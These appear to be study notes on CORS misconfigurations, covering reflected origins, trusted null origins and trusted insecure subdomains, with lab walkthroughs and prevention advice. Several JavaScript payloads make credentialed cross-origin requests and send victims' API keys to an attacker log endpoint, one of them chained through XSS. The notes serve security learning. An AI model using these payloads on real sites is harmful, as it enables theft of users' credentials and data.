## Definition
Cross-origin resource sharing (CORS:
is a browser mechanism -->  which enables controlled access to resources located outside 
						 of a given domain
It extends and adds flexibility -->  to the same-origin policy

However, it also provides -->  potential for cross-domain attacks, 
                          if a website's CORS policy is poorly configured and implemented

## Same-origin policy (SOP)
restrictive cross-origin specification that:
limits the ability for a website to interact with resources outside of the source domain

### Relaxation of SOP
The same-origin policy is very restrictive 
=>
consequently various approaches have been devised to circumvent the constraints

## Vulnerabilities arising from CORS configuration issues
Many modern websites use CORS to:
allow access from subdomains and trusted third parties
but:
their implementation of CORS may contain mistakes =>  this can result in vuln

### Server-generated ACAO header from client-specified Origin header
Some applications need to -->  provide access to a number of other domains. 
Maintaining a list of allowed domains:
- requires ongoing effort
- and any mistakes risk breaking functionality
=>
some apps take the easy route =>  allowing access from any other domain.

One way to do this is:
- by reading the Origin header from requests 
- including a response header stating that the requesting origin is allowed. 

For example, consider an application that receives the following request:

```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com 
Origin: https://malicious-website.com 
Cookie: sessionid=...
```
It then responds with:
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://malicious-website.com 
Access-Control-Allow-Credentials: true 
...
```
These headers state that:
- access is allowed from the requesting domain (`malicious-website.com`) 
- the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`)
- so will be processed in-session.

Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header:
this means that -->  ANY domain can access resources from the vulnerable domain.
If the response contains any sensitive information such as an API key or CSRF token:
=>
you could retrieve this by placing the following script on your website:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true; 
req.send(); 
function reqListener() { 
	location='//malicious-website.com/log?key='+this.responseText; 
};
```

#### CORS vulnerability with basic origin reflection
1. Check intercept is off, then use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header:
   `Origin: https://example.com`
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header.
5. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL:
   
```javascript
  <script> 
	  var req = new XMLHttpRequest(); 
	  req.onload = reqListener; 
	  req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	   req.withCredentials = true; 
	   req.send(); 
	   function reqListener() { 
		   location='/log?key='+this.responseText; 
	  }; 
</script>
```

6. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
7. Go back to the exploit server and click **Deliver exploit to victim**.
8. Click **Access log**, retrieve and submit the victim's API key to complete the lab


### Whitelisted null origin value
The specification for the Origin header supports the value `null`. 
Browsers might send the value `null` in the Origin header in various unusual situations:
- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.

Some apps might whitelist the `null` origin to support local development of the app. 
For example, suppose an app receives the following cross-origin request:

```http
GET /sensitive-victim-data 
Host: vulnerable-website.com 
Origin: null
```

And the server responds with:
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: null 
Access-Control-Allow-Credentials: true
```
=>
In this situation, an attacker can:
use various tricks to generate a cross-origin req contain the value `null` in the Origin header. This will:
- satisfy the whitelist
- leading to cross-domain access

For example, this can be done using a sandboxed `iframe` cross-origin request of the form:
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

#### CORS vulnerability with trusted null origin
- Check intercept is off, then use Burp's browser to log in to your account. Click "My account".
- Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header `Origin: null.`
- Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.
- In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with the URL for your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with the exploit server ID:
- 
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
- Notice the use of an iframe sandbox as this generates a null origin request.
- Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
- Go back to the exploit server and click "Deliver exploit to victim".
- Click "Access log", retrieve and submit the victim's API key to complete the lab

### Breaking TLS with poorly configured CORS
Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. 
For example, when the application receives the following request: 

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
 The application responds with:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
 In this situation, an attacker who is in a position to intercept a victim user's traffic:
 can exploit the CORS config -->  to compromise the victim's interaction with the app 
 
 This attack involves the following steps:
- The victim user makes any plain HTTP request.
- The attacker injects a redirection to -->  `http://trusted-subdomain.vulnerable-website.com`
- The victim's browser follows the redirect.
- The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to -->  `https://vulnerable-website.com`
- The victim's browser makes the CORS request, including the origin:
  `http://trusted-subdomain.vulnerable-website.com`
- The app allows the request because this is a whitelisted origin. 
  The requested sensitive data is returned in the response.
- The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control

This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure. 

#### CORS vulnerability with trusted insecure protocols
1. Check intercept is off, then use Burp's browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name.
4. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
5. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain.
6. Observe that the `productID` parameter is vulnerable to [XSS](https://portswigger.net/web-security/cross-site-scripting).
7. In the browser, go to the exploit server and enter the following HTML, replacing `YOUR-LAB-ID` with your unique lab URL and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:
   
```javascript
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

8. Click **View exploit**. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
9. Go back to the exploit server and click **Deliver exploit to victim**.
10. Click **Access log**, retrieve and submit the victim's API key to complete the lab

## Prevent CORS-based attacks
CORS vulnerabilities arise primarily as misconfigurations
Prevention is therefore a configuration problem.

### Proper configuration of cross-origin requests
If a web resource contains sensitive information
=>
the origin should be properly specified in the `Access-Control-Allow-Origin` header.

### Only allow trusted sites
Origins specified in the `Access-Control-Allow-Origin` header should only be:
sites that are trusted.
In particular:
dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.

### Avoid whitelisting null
Avoid using the header `Access-Control-Allow-Origin: null`
Cross-origin resource calls from internal documents and sandboxed requests:
can specify the `null` origin. 
CORS headers should be:
properly defined in respect of trusted origins for private and public servers.

### Avoid wildcards in internal networks
Avoid using wildcards in internal networks. 
Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.

### CORS is not a substitute for server-side security policies
CORS defines:
browser behaviors and is never a replacement for server-side protection of sensitive data
=>
an attacker can directly forge a request from any trusted origin. 
=>
web servers should continue to apply protections over sensitive data, 
such as authentication and session management, 
in addition to properly configured CORS.